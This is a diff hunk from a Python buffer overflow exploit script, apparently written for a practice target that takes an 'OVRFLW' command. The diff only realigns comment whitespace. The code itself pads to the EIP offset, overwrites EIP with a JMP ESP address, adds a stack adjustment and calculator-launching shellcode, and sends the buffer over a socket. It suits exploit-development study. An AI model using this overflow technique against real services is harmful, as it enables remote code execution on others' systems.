@@ -35,12 +35,12 @@ shellcode_calc += b"\x26\xe6\xaa\x62\x08\x83\xd2\x07"
 
 
 buf =  b""
-buf += b"A"*(offset_eip - len(buf))		# padding
-buf += struct.pack("<I", ptr_jmp_esp)		# EIP overwrite with "JMP ESP"
+buf += b"A"*(offset_eip - len(buf))             # padding
+buf += struct.pack("<I", ptr_jmp_esp)           # EIP overwrite with "JMP ESP"
 buf += b"\x90"*(offset_esp - offset_eip - 4)	# Padding between EIP and ESP
-buf += sub_esp_10				# ESP overwrite (we move it to avoid any overwrite - nopsled alternative)
-buf += shellcode_calc				# The SHELLCODE
-buf += b"D"*(buf_totlen - len(buf))		# Trailing Padding
+buf += sub_esp_10                               # ESP overwrite (we move it to avoid any overwrite - nopsled alternative)
+buf += shellcode_calc                           # The SHELLCODE
+buf += b"D"*(buf_totlen - len(buf))             # Trailing Padding
 buf += b"\n"
 
 s.send(b"OVRFLW " + buf + b"\n")
